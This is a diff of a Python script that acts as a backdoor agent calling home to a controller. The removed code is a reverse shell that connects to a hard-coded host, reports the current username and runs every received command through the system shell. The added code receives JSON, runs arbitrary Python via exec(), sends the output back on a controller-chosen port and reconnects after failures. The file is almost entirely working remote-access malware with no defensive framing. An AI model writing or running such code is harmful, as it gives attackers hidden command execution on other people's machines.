@@ -1,26 +1,69 @@
 #!/usr/bin/python
 
-import socket,subprocess,time,getpass,fcntl,struct
+import socket,subprocess,time,getpass,fcntl,struct,os,json,sys
+from cStringIO import StringIO
 
-HOST = "10.0.5.1"     # The home ship
-PORT = 31337          # The same port as used by the server
-LOCALIP = socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s', "eth0"))[20:24])
+HOST = "127.0.0.1"     # The home ship
+STATICPORT = 31341    # The same port as used by the server
+PORT = -1
+SCRIPTNAME = os.path.basename(__file__)
 
-while 1:
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	try:
-		s.connect((HOST, PORT))
-	except: 
-		time.sleep(5)
-		continue
+def readuntil(s):
+	b = ""
+	while chr(255) not in b:
+		b += s.recv(1)
+	return b
 
-	s.send(getpass.getuser())
+def migratePorts(port, data):
+	PORT = int(port)
+	time.sleep(3)
+	print "[~] Migrating to {0}".format(PORT)
 
-	while 1:
-	     data = s.recv(1024)
-	     if data == "quit\n": break
-	     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-	     stdout_value = proc.stdout.read() + proc.stderr.read()
-	     s.send(stdout_value)
-        
+	global s
 	s.close()
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.settimeout(5)
+	s.connect((HOST, PORT))
+	s.send(json.dumps({"data": data})+chr(255))
+
+def code(command, port):
+	print '[~] Running "{0}"'.format(command)
+
+	try:
+		old_stdout = sys.stdout
+		redirected_output = sys.stdout = StringIO()
+		exec(command)
+		sys.stdout = old_stdout
+
+		output = redirected_output.getvalue()
+
+		try:
+			migratePorts(port, output)
+		except:
+			s.close()
+			time.sleep(5)
+			main()
+	except:
+		pass
+
+commands = {"NEWPORT": migratePorts, "CODE": code}
+
+
+def main():
+	global s
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.settimeout(5)
+	s.connect((HOST, STATICPORT))
+
+	while(1):
+		try:
+			data = readuntil(s)[:-1]
+			data = json.loads(data)
+			code(data["code"], data['newport'])
+		except socket.timeout:
+			break
+
+	main()
+
+main()
+
